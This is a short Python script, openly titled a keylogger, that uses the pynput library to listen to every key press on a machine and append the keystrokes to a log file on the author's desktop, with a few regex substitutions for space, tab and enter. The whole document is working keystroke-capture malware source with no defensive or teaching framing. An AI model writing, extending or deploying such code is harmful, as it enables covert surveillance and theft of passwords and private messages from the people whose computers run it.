
##====================================================================##
##                                                                    ##
## SOFTWARE: Keylogger python.                                        ##
## AUTHOR: Charles Dantas (chameleon)                                 ##
## VERSION: 1.0                                                       ##
## CREATION DATE: 03/07/2022                                          ##
##                                                                    ##
##====================================================================##

#Important: pip3 install pynput
from pynput.keyboard import Listener
import re
import os

file = "/home/chameleon/Desktop/Logger.txt"



def cap(key):
    key = str(key)
    key = re.sub(r'\'', '', key)
    key = re.sub(r'Key.space', ' ', key)
    key = re.sub(r'Key.tab', ' ', key)
    key = re.sub(r'Key.ctrlc', ' ', key)
    key  = re.sub(r'Key.enter', ' \n ', key)
    key = re.sub(r'key.*', ' ', key)
    with open(file, 'a') as  log:
        log.write(key)


with Listener(on_press=cap) as logOnPress:
    logOnPress.join()
